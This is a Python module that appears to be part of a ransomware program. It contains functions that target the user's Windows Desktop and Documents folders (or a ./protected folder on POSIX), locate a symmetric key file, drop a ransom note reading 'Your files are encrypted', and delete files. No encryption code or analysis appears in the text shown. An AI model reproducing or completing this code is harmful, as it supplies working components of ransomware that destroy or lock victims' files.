import os

def get_target_directories():
    current_user = os.getlogin()
    current_os = os.name
    directories = []
    if current_os == "posix":
        subdirs = ["./protected"]
        directories += subdirs
    else:
        base_dir = f"C:/Users/{current_user}"
        subdirs = ["/Desktop", "/Documents"]
        for subdir in subdirs:
            directories.append(base_dir + subdir)
    return directories

def get_symkey_filepath():
    keyfilepath = "./protected/sym.key" if os.name == "posix" else f"C:/Users/{os.getlogin()}/Desktop/sym.key" 
    return keyfilepath

def drop_notice():
    notice = "Your files are encrypted.\nSorry.\n:(\n"
    filepath = "./protected/notice.txt" if os.name == "posix" else f"C:/Users/{os.getlogin()}/Desktop/notice.txt" 
    encrypted_file = open(filepath, "w")
    encrypted_file.write(notice)
    encrypted_file.close()

def remove_file(filepath):
    os.remove(filepath)

def get_unwanted_directories():
    return ["Recycle Bin"]